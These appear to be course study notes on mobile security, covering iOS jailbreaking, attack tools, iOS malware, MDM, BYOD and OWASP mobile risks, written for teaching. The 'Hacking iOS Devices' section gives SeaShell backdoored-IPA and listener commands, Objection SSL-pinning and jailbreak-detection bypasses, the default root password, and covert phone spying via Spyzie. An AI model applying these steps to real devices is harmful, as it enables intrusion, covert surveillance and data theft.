				- Hexxa Plus is a jailbreak repo extractor designed for the latest iOS versions, allowing users to install themes, tweaks, and apps without requiring an untethered or semi-untethered jailbreak. This method is one of the most popular ways to install jailbreak apps safely.
				- By extracting repositories, users can access a wide range of jailbreak tweaks, themes, and games. Hexxa Plus enables the installation of popular jailbreak apps on the latest iOS versions through a developer code extraction method. To install Hexxa Plus for free, users must first install a third-party app manager, such as zJailbreak Pro.
				- Steps to Install Hexxa Plus:
					- Open the Xookz App Store and select Hexxa (Full).
					- In the upper-right corner, tap the Install button to download the configuration profile onto your iPhone.
						- Note: If a pop-up appears during installation, tap Allow.
					- Go to Settings -> tap Profile Downloaded -> tap Install.
					- Enter your screen passcode and tap Install again.
					- The Hexxa Plus Repo Extractor icon will appear on your home screen.
					- Open the Hexxa Plus Repo Extractor and tap Get Repos.
					- Select a preferred jailbreak repository and copy its URL from the available categories.
					- Tap Extract Repo, then paste the copied URL.
					- Click OK to extract the jailbreak repository.
			- Redensa (pangu8.com):
				- Redensa is a jailbreak solution that includes iTerminal, making it easier to install jailbreak apps and tweaks—especially on iOS 17 and later versions, where traditional jailbreaking methods can be challenging. This tool also simplifies IPA installations on the latest iOS versions using the "Install" command.
			- checkra1n (checkra.in)
			- palera1n (palera.in)
			- Zeon (zeon-app.com)
			- Sileo (en.sileem.com)
			- Cydia (www.cydiafree.com)
	- Hacking iOS Devices:
		- Attackers use various methods to exploit iOS vulnerabilities. They employ exploit chain tools that target multiple security weaknesses to bypass different layers of iOS protection. Additionally, they install malicious software such as spyware and Trojans to compromise iOS devices.
		- Hacking Using Spyzie (spyzie.io):
			- Attackers utilize online tools like Spyzie to hack target iOS mobile devices. Spyzie enables them to access SMS, call logs, app chats, GPS data, and more. This tool is compatible with various iOS devices, including iPhones, iPads, and iPods. Attackers can hack the target device remotely in stealth mode without requiring jailbreaking.
		- iOS Trustjacking (www.broadcom.com):
			- iOS Trustjacking is a vulnerability that attackers can exploit to remotely access an iOS device, allowing them to read messages and emails, capture sensitive information such as passwords and banking credentials, and monitor the device’s activity—all without the victim’s knowledge.
			- This vulnerability leverages the “iTunes Wi-Fi Sync” feature. When a victim connects their iPhone to a trusted computer—such as a friend's device or any seemingly safe system—that has already been compromised by an attacker, the risk begins.
			- When an iOS device attempts to connect to a computer, it prompts the user with a “Trust” or “Don’t Trust” dialog box. If the victim selects “Trust,” a persistent connection is established, allowing data sharing between the devices.
			- Once this connection is established and iTunes Wi-Fi Sync is enabled, the iOS device can continue communicating with the trusted computer even after being physically disconnected. This means that if the computer is infected, the attacker can gain continuous remote access to the victim’s device.
			- Unless the victim manually resets their device’s connection settings, the attacker can:
				- Monitor the victim’s screen activity from the compromised computer.
				- Track the device’s data and operations remotely, even when the phone is outside the network’s range.
				- Back up or restore device data to access SMS history, deleted photos, and apps.
				- Replace legitimate apps on the device with malicious versions from the compromised computer.
			- This persistent access makes Trustjacking a serious security threat, potentially exposing users to data theft and unauthorized device control.
		- Post-Exploitation on iOS Devices Using the SeaShell Framework (github.com):
			- SeaShell is an iOS post-exploitation framework that enables attackers to remotely access, control, and extract sensitive information from compromised devices. This framework exploits the CoreTrust vulnerability, which allows bypassing security checks for unauthorized software execution.
			- Using the SeaShell Framework, attackers can install malicious software on target devices by generating IPA files, initiating a TCP listener, and exploiting CoreTrust bugs via TrollStore. This grants them an interactive session with the compromised device, utilizing a Pwny payload with dynamic extension and TLS encryption.
			- Steps to Perform Post-Exploitation on iOS Devices Using the SeaShell Framework:
				- Step 1: Launch the SeaShell Framework:
					- Run the following command: seashell
				- Step 2: Patch an IPA File and Configure Connection Details:
					- Patch an IPA file and provide the IP address and port number to establish a connection: ipa patch Instagram.ipa
				- Step 3: Start a Listener on the Host Machine:
					- Start a listener on the specified IP address and port: listener on <IP address> <Port number>
					- Once the compromised application is opened, you will receive a connection.
				- Step 4: Interact with the Compromised Device:
					- To interact with the compromised device using an interactive shell with Pwny, run: devices -i <device_id>
					- For a list of available commands, run: help
				- Step 5: Retrieve Web Browsing History:
					- Once the remote session is established, execute the following command to extract the Safari browsing history: safari_history
					- Note: This command retrieves and parses the browsing history database located at: /var/mobile/Library/Safari/
		- Analyzing and Manipulating iOS Applications:
			- Attackers perform static analysis on a target iOS application to detect vulnerabilities such as hard-coded sensitive data, application bugs, and backdoors within the code. They conduct dynamic analysis to identify runtime errors, application behavior, memory states, registers, and variables during execution. By analyzing the application, attackers can determine the attack surface, which they can exploit to launch attacks on target iOS devices.
			- Manipulating an iOS Application Using Cycript (www.cycript.org):
				- Cycript is a runtime manipulation tool that attackers use to exploit vulnerabilities in source code and modify functionality during application execution. It is a JavaScript (JS) interpreter capable of understanding Objective-C, Objective-C++, and JS commands. Cycript features an interactive console with syntax highlighting and grammar-assisted tab completion.
				- After decompiling an iOS application and analyzing its source code, attackers can use Cycript to manipulate the application’s functionality. This includes performing activities such as method swizzling, authentication bypass, and jailbreak detection bypass.
			- OS Method Swizzling:
				- Method swizzling, also known as monkey patching, is a technique that modifies existing methods or adds new functionality at runtime. The Objective-C runtime allows developers to switch method functionality from its original implementation to a customized one. Attackers exploit this technique for purposes such as logging, injecting JavaScript (JS) into WebViews, bypassing detections, and circumventing authentication mechanisms.
				- Attackers leverage method swizzling to assess the security posture of an application and identify its vulnerabilities. The basic steps to successfully swap method functionality are as follows:
					- Identify the existing method selector reference to be swapped.
					- Create a new method with customized functionality.
					- Run the application on the device.
					- Swap the method’s functionality by providing the new method reference to the Objective-C runtime.
			- Extracting Secrets Using Keychain Dumper (github.com):
				- iOS devices use an encrypted storage system called the keychain to store sensitive information such as passwords, certificates, and encryption keys. Attackers leverage tools like Keychain Dumper to extract keychain data from a target iOS device.
				- To dump secret keychain data from an iOS app, attackers use the Keychain Dumper binary, which includes a self-signed certificate with a wildcard entitlement. However, since recent iOS versions no longer allow wildcard entitlements, attackers must instead add an explicit entitlement that exists on the device to gain access to all keychain items.
			- Analyzing an iOS Application Using Objection (github.com):
				- Attackers use the Objection tool to perform method hooking on an iOS application at runtime. It also includes features such as iOS application patching, SSL pinning bypass, keychain dumping, and pasteboard monitoring. To use Objection, attackers connect an iOS device to their workstation and install the tool, which is built on Frida.
				- Method Hooking:
					- After installing Objection, follow these steps to perform method hooking:
						- Execute the following command to run Objection and attach it to the target application: objection --gadget <AppName> explore
						- Monitor method calls of a specific class: ios hooking watch class <Class_Name>
						- Hook a specific method in a class: ios hooking watch method "-[Class_Name Method_Name]"
						- Modify the return value of a function that returns Boolean values: ios hooking set return_value "-[Class_Name iFunction_Name:]" true/false
				- Bypassing SSL Pinning:
					- Disable SSL pinning in the hooked application: ios sslpinning disable
				- Bypassing Jailbreak Detection:
					- Disable jailbreak detection in the hooked application: ios jailbreak disable
		- Analyzing iOS Devices (mas.owasp.org):
			- Analyzing iOS devices enables attackers to understand system architecture, uncover vulnerabilities, and identify exploitable weaknesses. This process may reveal potential entry points, such as outdated software versions, insecure configurations, or applications with known security flaws. Attackers can also examine device behaviors, system processes, and app interactions to identify opportunities for compromise. Additionally, understanding common user practices and social engineering tactics can help attackers design effective phishing campaigns or malware distribution strategies. Ultimately, analyzing iOS devices aids attackers in preparing targeted attacks that bypass security controls and gain unauthorized access to sensitive data or system functionality.
			- Techniques for Analyzing an iOS Device:
				- Accessing the Device Shell:
					- This technique involves remotely accessing an iOS device’s shell, either over Wi-Fi or a USB connection. Doing so allows an attacker to execute arbitrary commands, manipulate system settings, and gain deeper control over the device. Attackers commonly access remote shells on iOS devices via SSH; however, the device must be jailbroken. Additionally, tools such as Cydia or Sileo must be installed for further exploitation.
					- Steps to Access the Device Shell Over Wi-Fi:
						- Install the OpenSSH package on the iOS device and ensure both the device and the host computer are connected to the same Wi-Fi network.
						- Run the following command in a terminal to access the device shell: ssh root@<device_ip_address>
						- To exit the shell, type exit or press Control + D.
						- Note: The default users are "root" and "mobile", and the default password for both is "alpine".
					- Steps to Access the Device Shell Over USB (If Wi-Fi Is Unavailable):
						- If a Wi-Fi connection is unavailable, attackers can connect to the device shell via USB using a socket daemon such as usbmuxd, which allows an SSH connection over USB.
						- Connect the iOS device to a macOS machine using tools such as iproxy.
						- Run the following command in a new terminal window to establish a connection: ssh -p 2222 root@localhost
						- When prompted, enter the root password:
							root@localhost's password:
							iPhone:~ root#
						- Note: Due to USB Restricted Mode, a data connection cannot be maintained for more than one hour if the device is in a locked state.
				- Listing Installed Apps:
					- Before analyzing an application, attackers must first identify its correct bundle identifier. They can use tools such as Frida to list all apps currently installed on the device by running the following command: frida-ps -Uai
					- Once the list is generated, attackers should note the bundle identifier and process ID (PID) for further use.
				- Network Sniffing:
					- Attackers can remotely sniff network traffic in real time by creating a virtual interface and following these steps:
						- Connect the target iOS device to a macOS system via USB.
						- Start a remote virtual interface by running the following command in the Terminal: rvictl -s <UDID_of_the_iOS_device>
						- Open Wireshark and select “rvi0” as the capture interface.
						- Apply capture filters to monitor specific network traffic. For example, to capture all HTTP traffic sent or received through a specific IP address, use the following filter: ip.addr == 192.168.2.4 && http
				- Obtaining Open Connections:
					- By analyzing open connections on an iOS device, an attacker can identify active network sessions, monitor data exchanges, and potentially intercept sensitive information. This information can provide insights into targeted attacks or unauthorized data access.
					- To retrieve details about open connections, the following commands can be executed:
						- List all open network ports for active processes on the device: lsof -i
						- List open network ports for a specific process (replace <pid> with the actual process ID): lsof -i -a -p <pid>
				- Process Exploration:
					- Exploring active processes allows attackers to gather detailed information about an app's memory usage. This may include searching for specific data, obtaining memory maps along with loaded libraries, and reverse engineering binary data. For this purpose, attackers can use tools such as r2frida in combination with a target app like iGoat-Swift.
					- Some useful commands for process exploration include:
						- Start an r2frida session: r2 frida://usb//iGoat-Swift
						- Note: Ensure that the iGoat-Swift app is running on the iOS device and that the device is connected via USB.
						- Retrieve the app's memory maps: :dm
						- List the binaries and libraries loaded by the app: :il
						- Perform an in-memory search, displaying only the results while hiding search progress: \e~search
		- iOS Malware:
			- GoldPickaxe (www.malwarebytes.com, www.group-ib.com):
				- The GoldPickaxe Trojan enables attackers to deceive victims by scanning their faces and extracting information from identification documents. Attackers typically approach victims through smishing or phishing messages that appear to come from legitimate government sources, convincing them to install a fake service application.
				- On iOS devices, attackers instruct victims to install a disguised version of a Mobile Device Management (MDM) profile. This grants attackers remote control over the targeted iOS device, allowing them to send profiles and execute commands.
				- Since MDM includes features such as remote wiping, device tracking, and app management, attackers exploit these capabilities to install malicious apps and extract sensitive information. Additionally, victims are instructed to take a photo of their official ID and scan their face using an app. Attackers also request victims' phone numbers to obtain further personal details, including banking information.
			- SpectralBlur
			- Mercenary Spyware
			- LightSpy
			- KingsPawn
			- Pegasus
		- iOS Hacking Tools:
			- Elcomsoft Phone Breaker (www.elcomsoft.com): Elcomsoft Phone Breaker enables attackers to perform logical and over-the-air acquisition of iOS devices, bypass encrypted backups, and extract and analyze backups, synchronized data, and passwords from Apple iCloud. It allows password cracking and iOS backup decryption with GPU acceleration. Using this tool, attackers can decrypt the iCloud Keychain, as well as retrieve messages, media files, and documents from iCloud.
			- Enzyme (github.com)
			- Network Analyzer: net tools (apps.apple.com)
			- iOS Binary Security Analyzer (github.com)
			- iWepPRO (apps.apple.com)
			- Frida (frida.re)
	- Securing iOS Devices:
		- Follow these best practices to protect your iOS device and data from attackers:
			- Access & Authentication:
				- Enable a strong passcode: Go to Settings -> Face ID & Passcode -> Turn Passcode On. Use six-digit codes, Touch ID, or Face ID.
				- Use separate passcodes for sensitive apps when possible.
				- Enable two-factor authentication: Settings -> [Your Name] -> Sign-In & Security -> Turn On Two-Factor Authentication.
				- Enable Erase Data on failed attempts: Settings -> Face ID & Passcode -> Erase Data (erases data after 10 failed attempts).
			- Network & Connectivity:
				- Use secure Wi-Fi networks and avoid accessing web services on compromised networks.
				- Enable “Ask to Join Networks”: Settings -> Wi-Fi -> Ask to Join Networks to avoid random Wi-Fi connections.
				- Disable Bluetooth and Wi-Fi when not in use: Settings -> Bluetooth/Wi-Fi -> Toggle OFF.
				- Install VPN software to encrypt internet traffic.
			- App & Browser Security:
				- Download apps only from the Apple App Store and use only trusted third-party apps.
				- Enable Safari’s privacy settings: Settings -> Safari, then:
					- Block pop-ups
					- Disable passwords and AutoFill
					- Enable Fraudulent Website Warning
					- Block cookies
					- Clear browsing data
				- Disable JavaScript and add-ons in the browser for better security.
				- Enable "Do Not Track": Settings -> Safari -> Do Not Track.
				- Disable AutoFill in Safari: Settings -> Safari -> AutoFill -> OFF.
			- Data Protection & Encryption:
				- Avoid storing sensitive data on the device or in a client-side database.
				- Disable iCloud backup for enterprise data: Settings -> Apple ID -> iCloud.
				- Leverage iOS full-disk encryption for stored data protection.
				- Install vault apps to securely store critical data.
				- Prevent sensitive data from appearing on the lock screen: Settings -> Notifications -> Show Previews -> Never.
			- Device & System Security:
				- Do not jailbreak your device, especially in enterprise environments.
				- Enable Jailbreak detection and protect Apple ID/Google accounts.
				- Change the default iPhone root password ("alpine") if applicable.
				- Disable Siri: Settings -> Siri & Search -> Listen for -> OFF.
				- Disable voice dialing: Settings -> Face ID & Passcode -> Voice Dial -> OFF.
				- Disable geotagging for photos: Settings -> Privacy & Security -> Location Services -> Camera -> Never.
				- Reset keyboard dictionary periodically: Settings -> General -> Transfer or Reset iPhone -> Reset Keyboard Dictionary.
				- Reset network settings if suspicious activity occurs: Settings -> General -> Transfer or Reset iPhone -> Reset Network Settings.
				- Control data shared with Apple: Settings -> Privacy & Security -> Analytics & Improvements.
			- Software Updates & Management:
				- Keep iOS updated: Settings -> General -> Software Updates.
				- Enable automatic app updates: Settings -> App Store -> Automatic Downloads -> App Updates.
				- Use Mobile Device Management (MDM) for remote tracking, lockout, and data wipe in case of loss or theft.
			- Additional Security Measures:
				- Prevent “juice jacking”: Use a personal charger or a USB data blocker when charging in public.
				- Limit ad tracking: Settings -> Privacy -> Advertising -> Limit Ad Tracking.
			- Note: Feature paths may vary based on iOS version and device model.
		- iOS Device Security Tools:
			- Malwarebytes Mobile Security (www.malwarebytes.com): Malwarebytes Mobile Security blocks intrusive ads in Safari, preventing ad trackers from monitoring your online activity. It filters text messages, directing suspicious or junk messages to separate folders. Additionally, it blocks fraudulent calls, phishing sites, and malicious content to protect against scams. The built-in VPN enhances online privacy by encrypting your connections, ensuring safe browsing and streaming from anywhere.
			- Norton Mobile Security for iOS (us.norton.com)
			- McAfee Mobile Security (www.mcafee.com)
			- Trend MicroTM Mobile Security for iOS (www.trendmicro.com)
			- AVG Mobile Security (www.avg.com)
			- Kaspersky Standard (www.kaspersky.com)
		- iOS Device Tracking Tools:
			- Find My (support.apple.com):
				- Find My is an iOS device tracking tool that allows users to locate a lost or misplaced iPhone, iPad, iPod Touch, or Mac using another iOS device. It also helps protect data on the missing device.
				- To use Find My, the user must install the app on another iOS device, open it, and sign in with their Apple ID. The tool enables users to:
					- Locate their missing device on a map.
					- Remotely lock the device.
					- Play a sound to help find it.
					- Display a message.
					- Erase all data on the device.
				- Find My also includes Lost Mode, which works on devices running iOS 6 or later. Lost Mode locks the missing device with a passcode and displays a custom message, such as a contact phone number, on the lock screen. While in Lost Mode, the device continues tracking its location so the user can view its recent location history in the Find My app.
				- How to Set Up Find My for iPhone, iPad, or iPod Touch:
					- Open the Settings app.
					- Tap [Your Name] -> Find My.
					- Tap Find My [Device], then turn it on.
					- To locate the device even when offline, enable Find My network.
					- To have the device send its location to Apple when the battery is low, enable Send Last Location.
			- Glympse En Route (corp.glympse.com)
			- Prey Find My Phone & Security (apps.apple.com)
			- Mobile Phone Tracker Pro - SIM (apps.apple.com)
			- FollowMee GPS Location Tracker (apps.apple.com)
			- Phone Tracker: GPS Location (apps.apple.com)
- Mobile Device Management:
	- Mobile Device Management (MDM) is becoming increasingly important as organizations adopt policies such as Bring Your Own Device (BYOD). The growing number and variety of mobile devices—including smartphones, laptops, and tablets—have made it challenging for enterprises to establish policies and manage these devices securely. MDM refers to a set of policies and security measures designed to manage and protect these devices effectively. Organizations use specialized security software to administer all mobile devices connected to the enterprise network. This section explores MDM and its solutions for securing, monitoring, managing, and supporting mobile devices.
	- Mobile Device Management (MDM):
		- Mobile Device Management (MDM) provides platforms for the over-the-air or wired distribution of applications, data, and configuration settings for various mobile devices, including mobile phones, smartphones, and tablets. It helps organizations implement enterprise-wide policies to reduce support costs, minimize business disruptions, and mitigate security risks. MDM enables system administrators to deploy and manage software applications across all enterprise mobile devices, ensuring security, monitoring, management, and support. It can be used to manage both company-owned and employee-owned (BYOD) devices within the enterprise.
		- Key Features of MDM Software:
			- Requires a passcode for device access
			- Remotely locks the device if lost
			- Remotely wipes data from lost or stolen devices
			- Detects whether a device is rooted or jailbroken
			- Enforces policies and tracks inventory
			- Provides real-time monitoring and reporting
	- Mobile Device Management Solutions:
		- Scalefusion MDM (scalefusion.com): Scalefusion MDM provides IT teams with comprehensive visibility across the network, enabling them to secure, manage, and monitor corporate- or employee-owned devices that access corporate data. This solution ensures the security of devices running on Android, iOS, macOS, and Windows in diverse environments. Scalefusion MDM helps enterprises manage various endpoints, including smartphones and tablets, to enhance employee productivity.
		- ManageEngine Mobile Device Manager Plus (www.manageengine.com)
		- Microsoft Intune (www.microsoft.com)
		- SOTI MobiControl (soti.net)
		- AppTec360 (www.apptec360.com)
		- Jamf Pro (www.jamf.com)
	- Bring Your Own Device (BYOD):
		- Bring Your Own Device (BYOD) refers to a policy that allows employees to bring their personal devices—such as laptops, smartphones, and tablets—to the workplace and use them to access the organization’s resources based on their access privileges. BYOD enables employees to work with devices they are comfortable with, aligning with their preferences and professional needs. While the “work anywhere, anytime” approach enhances flexibility, the primary challenge of the BYOD trend lies in securing company data and ensuring compliance with regulatory requirements.
		- BYOD Benefits:
			- Adopting BYOD is advantageous for both companies and employees. Some key benefits include:
			- Increased Productivity: Employees are more proficient with their personal devices, which enhances efficiency. Additionally, they often upgrade to the latest technology, allowing enterprises to benefit from cutting-edge software and hardware advancements.
			- Employee Satisfaction: With BYOD, employees use devices of their choice, which they purchase and maintain themselves. This eliminates the need for multiple devices, as personal and corporate data coexist on a single device, improving convenience and user experience.
			- Work Flexibility: BYOD enables employees to carry one device for both personal and professional needs. With access to corporate data from anywhere, employees are not restricted to office-based work. Unlike company-owned devices, personal devices often come with fewer restrictions, allowing greater freedom. Furthermore, BYOD replaces the traditional client-server model with a mobile and cloud-centric approach, offering long-term benefits.
			- Lower Costs: Businesses that adopt BYOD reduce hardware expenses, as employees invest in their own devices. Additionally, data service costs shift to employees, who are more likely to take better care of their own property.
		- BYOD Risks:
			- Allowing employees to connect their personal devices to the corporate network and access organizational data introduces significant security risks. Some key BYOD security risks include:
			- Sharing Confidential Data on Unsecured Networks: Employees may access corporate data via public networks that lack encryption. Transmitting sensitive information over unsecured connections increases the risk of data leakage.
			- Data Leakage and Endpoint Security Issues: In the era of cloud computing, mobile devices serve as vulnerable endpoints with cloud connectivity. When synchronized with corporate email or applications, these devices store sensitive data. If lost or stolen, they can expose critical corporate information.
			- Improper Device Disposal: Discarding or repurposing a device without proper data erasure can leave behind sensitive information, such as financial records, credit card details, contact lists, and corporate data. It is essential to securely wipe devices before disposal or transfer.
			- Support for a Variety of Devices: While BYOD enhances productivity and employee satisfaction, managing multiple device types and operating systems increases IT complexity and costs. Employee-owned devices often lack standardized security measures, making it difficult for IT teams to enforce uniform controls.
			- Mixing Personal and Corporate Data: Storing both personal and corporate data on a single device raises serious security and privacy concerns. Organizations should implement data separation techniques, such as encryption and containerization, to protect business data. This approach also enables remote wiping of corporate information without affecting personal files when an employee leaves the organization.
			- Lost or Stolen Devices: Due to their portability, mobile devices are more susceptible to theft or loss. If a device containing corporate data falls into the wrong hands, unauthorized individuals may gain access to sensitive business information.
			- Lack of Employee Awareness: Employees may not be fully aware of BYOD security risks. Without proper training, they might inadvertently expose corporate data to threats. Organizations must educate staff on best practices to mitigate security risks.
			- Bypassing Network Security Policies: BYOD devices connected to wireless networks may bypass security policies enforced on wired networks. This inconsistency can lead to security gaps, making it harder for organizations to maintain compliance.
			- Infrastructure Challenges: Supporting a BYOD program requires IT teams to manage a diverse range of devices, operating systems, and applications. Compatibility issues, security vulnerabilities, and backup management complexities can strain IT resources.
			- Disgruntled Employees: Employees leaving an organization on bad terms may misuse corporate data stored on their personal devices or leak sensitive information to competitors.
			- Jailbreaking/Rooting: Some users may jailbreak or root their personal devices, bypassing built-in security features. This weakens device security and increases exposure to malware, unauthorized access, and cyber threats.
			- Inadequate Backup Practices: Personal devices may lack proper data backup mechanisms, increasing the risk of data loss due to hardware failure, accidental deletion, or cyberattacks.
			- Outdated Software and Patch Management: Failing to update operating systems and applications on personal devices leaves them vulnerable to security exploits, putting corporate data at risk.
			- Shadow IT and Unauthorized Cloud Services: Employees may use unauthorized cloud storage and file-sharing services on their devices, leading to shadow IT. This limits IT oversight and control over corporate data, increasing security and compliance risks.
		- BYOD Policy Implementation:
			- Organizations can reap significant benefits from implementing a BYOD policy, including higher user satisfaction and increased productivity through the use of advanced personal devices. However, without proper management, the introduction of new technology and processes can pose significant risks.
			- The five key principles of BYOD policy implementation are outlined below. By following these principles, organizations can minimize risks related to data security and privacy.
			- Define Your Requirements:
				- Not all employees have the same requirements. To effectively implement a BYOD policy, organizations should categorize employees based on factors such as job criticality, time sensitivity, mobility value, data access needs, and system access levels.
				- It is best to define user segments based on their work location and role (e.g., employees working from home, full-time remote workers, part-time remote workers, and day extenders). After segmenting users, assign an appropriate technology portfolio based on their specific needs.
				- A Privacy Impact Assessment (PIA) should be conducted at the outset of every BYOD initiative, with participation from all relevant teams. This assessment helps document objectives, privacy risks, mitigation strategies, and decisions throughout the project lifecycle. The mobile governance committee—comprising end users from each segment, line-of-business representatives, and IT management—should oversee this process.
			- Select Devices and Build a Technology Portfolio:
				- Decide how user access and data management will be handled. While a Mobile Device Management (MDM) system provides a baseline level of control, additional security measures such as virtual desktops or on-device software may be necessary to enhance security and data privacy.
				- Furthermore, ensure that your corporate IT environment supports WLAN device connectivity and network management to facilitate seamless integration of BYOD devices.
			- Develop Policies:
				- BYOD policies should be developed with input from multiple departments, including IT, HR, legal, security, and privacy teams. Key elements of a BYOD policy should include:
					- Information security requirements
					- Data protection guidelines
					- Confidentiality and ownership policies
					- Tracking and monitoring transparency
					- Procedures for termination of employment and data handling
					- Wi-Fi security best practices for employees
					- Acceptable and unacceptable use of BYOD devices
				- Employees must be clearly informed about the acceptable-use policy before enrolling in the BYOD program. Additionally, organizations should ensure that the BYOD policy applies not only to employees but also to third parties acting on their behalf. Proper enforcement of the policy is essential for effective implementation.
			- Security:
				- Mobile management technology is only effective when supported by well-defined policies. Organizations must maintain a secure mobile ecosystem to ensure the success of BYOD programs. This requires assessing the operating environment and implementing security solutions that address:
					- Asset and identity management
					- Local storage and removable media controls
					- Network access and application controls
					- Corporate vs. personal app management
					- Web and messaging security
					- Device health monitoring
					- Data loss prevention
				- Additionally, organizations should assess and document risks in the following areas:
					- Information Security: Protecting sensitive data, applications, and user segments
					- Operational Security: Safeguarding user information
					- Transmission Security: Ensuring secure data transmission over networks
			- Support:
				- The diverse nature of BYOD users can lead to an increase in support requests. To ensure long-term success, organizations should establish structured support processes early in the implementation phase.
				- Mobile governance committees should regularly review support needs, update policies, and ensure that mobile employees remain productive. Ongoing reassessments help refine the BYOD strategy and adapt to evolving technological and security challenges.
		- BYOD Security Guidelines:
			- For the Administrators:
				- With the rise of mobile devices at work, securing organizational data is crucial. Administrators should implement the following measures to protect the network and sensitive information:
				- Network & Data Protection:
					- Secure data centers with multi-layered security systems.
					- Encrypt all stored organizational data on mobile devices and use encrypted channels for data transfer.
					- Implement SSL-based VPNs for secure remote access.
					- Restrict offline access to sensitive information; require company network access.
				- Access Control & Authentication:
					- Register and authenticate devices before granting network access.
					- Enforce complex passcodes with periodic updates.
					- Implement multi-factor authentication, session timeouts, and periodic re-authentication.
					- Restrict access based on a need-to-know basis.
				- Device & Application Management:
					- Prohibit jailbroken or rooted devices.
					- Maintain a whitelist/blacklist of permitted and restricted apps.
					- Use containerization or sandboxing to separate corporate and personal data.
					- Enforce device encryption using tools like BitLocker or FileVault.
				- Policy Enforcement:
					- Educate employees on BYOD policies and require signed agreements.
					- Define app ownership and data management responsibilities.
					- Specify data wipe policies (total or selective) for departing employees.
				- Security Monitoring & Response:
					- Use enterprise mobility management (EMM) systems for real-time device monitoring.
					- Conduct regular security audits and vulnerability assessments.
					- Enable remote wipe and lock capabilities for lost or stolen devices.
					- Backup device data to offsite servers or the cloud.
				- Compliance & Continuous Improvement:
					- Require frequent OS and software updates to patch vulnerabilities.
					- Develop a blacklist of restricted applications.
					- Craft a secure offboarding strategy to remove sensitive data and revoke access.
			- For the Employees:
				- To protect personal and corporate data on mobile devices, employees should follow these security best practices:
				- Data Protection & Encryption:
					- Encrypt stored data using strong algorithms.
					- Maintain a clear separation between business and personal data.
					- Set strong passwords for devices and apps, changing them regularly.
					- Use automatic locking or biometric authentication for added security.
				- Device Security & Maintenance:
					- Keep the operating system and software updated with the latest patches.
					- Use antivirus and data loss prevention (DLP) solutions.
					- Avoid jailbreaking or rooting devices, as it compromises security.
					- Install device tracking software if company policy allows.
					- Register devices with a remote locate and wipe facility, if permitted.
				- Safe Usage & Access Control:
					- Be cautious when downloading files, visiting websites, or opening email links.
					- Review app permissions before installation and grant only necessary access.
					- Use a secure VPN when accessing public Wi-Fi networks.
					- Do not sync mobile devices with personal gadgets like TVs or desktops.
					- Avoid storing company data in personal cloud storage unless authorized.
				- Incident Response & Offboarding:
					- Report lost or stolen devices to IT immediately.
					- Wipe corporate data and access credentials before leaving the organization.
					- Use only authorized repair services for hardware modifications.
- Mobile Security Guidelines and Tools:
	- Like personal computers, mobile devices store sensitive data and are susceptible to various threats. Therefore, it is essential to secure them to prevent data breaches, reduce risks from viruses and Trojans, and mitigate other forms of cyber threats. Implementing strict security measures and using appropriate security tools can help protect these devices. This section outlines essential mobile security guidelines and protection tools to enhance the security of mobile devices.
	- Mobile Security Guidelines:
		- OWASP Top 10 Mobile Risks and Solutions (owasp.org):
			- According to OWASP, the following are the top 10 mobile security risks and their solutions:
			- Improper Credential Usage:
				- Avoid using hardcoded credentials.
				- Encrypt credentials during transmission.
				- Use secure, revocable access tokens instead of storing user credentials on the device.
				- Implement strong user authentication protocols.
				- Regularly update and rotate API keys or tokens
			- Inadequate Supply Chain Security:
				- Incorporate secure coding practices, code review, and testing during app development.
				- Ensure secure app signing and distribution processes.
				- Use only trusted and validated third-party libraries or components.
				- Apply security protocols for managing app updates, patches, and releases.
				- Monitor and detect supply chain security incidents through security testing and scanning.
			- Insecure Authentication/Authorization Usage:
				- Avoid weak authentication design patterns.
				- Reinforce server-side authentication.
				- Use Face ID and Touch ID for biometric unlocking and secure protection of authentication materials.
				- Validate roles and permissions of authenticated users.
				- Conduct local integrity checks to detect any unauthorized code alterations.
			- Insufficient Input/Output Validation:
				- Implement strict input and output validation techniques.
				- Perform context-specific validation based on data type and usage.
				- Use data integrity checks and follow secure coding practices.
				- Conduct regular security assessments.
			- Insecure Communication:
				- General Best Practices:
					- Assume that the network layer is susceptible to eavesdropping.
					- Apply SSL/TLS to the mobile app’s transport channels when transmitting data to a backend API or web service.
					- Use secure SSL versions for external entities when running browser/WebKit routines, and avoid mixed SSL sessions that could expose user session IDs.
					- Use strong, industry-standard cipher suites with appropriate key lengths.
					- Use certificates signed by a trusted Certificate Authority (CA).
					- Never allow bad certificates, such as self-signed, expired, untrusted root, revoked, or mismatched host certificates.
					- Consider implementing certificate pinning.
					- Always enforce SSL chain verification.
					- Verify the identity of the endpoint server using trusted certificates in the keychain before establishing a secure connection.
					- Alert users through the UI if the mobile app detects an invalid certificate.
					- Do not transmit sensitive data over alternate channels such as SMS, MMS, or notifications.
					- Apply an additional encryption layer to sensitive data before passing it to the SSL channel.
					- Use self-signed certificates or a local development Certificate Authority (CA) only in development environments—never in production.
					- Analyze application traffic to detect any data transmitted through plaintext channels.
				- iOS-Specific Best Practices:
					- Ensure that certificates are valid and configured to fail closed.
					- Use the Secure Transport API to designate trusted client certificates in CFNetwork.
					- Ensure that all NSURL calls do not allow self-signed or invalid certificates, such as the NSURL class method setAllowsAnyHTTPSCertificate.
					- Implement certificate pinning using the NSURL method connection:willSendRequestForAuthenticationChallenge.
				- Android-Specific Best Practices:
					- Remove any code that allows the application to accept all certificates, such as org.apache.http.conn.ssl.AllowAllHostnameVerifier or SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER.
					- If using a class that extends SSLSocketFactory, ensure that the checkServerTrusted method is correctly implemented to validate the server certificate.
					- Avoid overriding onReceivedSslError to bypass SSL certificate validation.
			- Inadequate Privacy Controls:
				- Minimize the amount and variety of Personally Identifiable Information (PII) processed in the application.
				- Ensure that access to sensitive data is protected with proper authentication and authorization.
				- Use static and dynamic security testing tools to detect logging of sensitive data or potential leakage to the clipboard or URL query parameters.
			- Insufficient Binary Protections:
				- Use code obfuscation and anti-tampering techniques to prevent reverse engineering of the app binary.
				- Implement local security checks, backend enforcement, and integrity checks to prevent the bypassing of security mechanisms.
				- Perform integrity checks at app startup to detect unauthorized redistribution or modification of app binaries.
			- Security Misconfiguration:
				- Ensure that default settings and configurations are properly secured to prevent exposure of sensitive information or unnecessary permissions.
				- Avoid using hardcoded default credentials.
				- Do not store application files with overly permissive permissions, such as world-readable or world-writable settings.
				- Request only the permissions necessary for the proper functioning of the application.
				- Disallow cleartext traffic and implement certificate pinning when possible.
				- Disable debugging features in the production version of the app.
				- Disable backup mode on Android devices to prevent unauthorized data restoration.
				- Reduce the application's attack surface by exporting only the necessary activities, content providers, and services.
			- Insecure Data Storage:
				- Implement robust encryption algorithms and best practices.
				- Use secure communication protocols such as HTTPS and SSL/TLS for transmitting sensitive data.
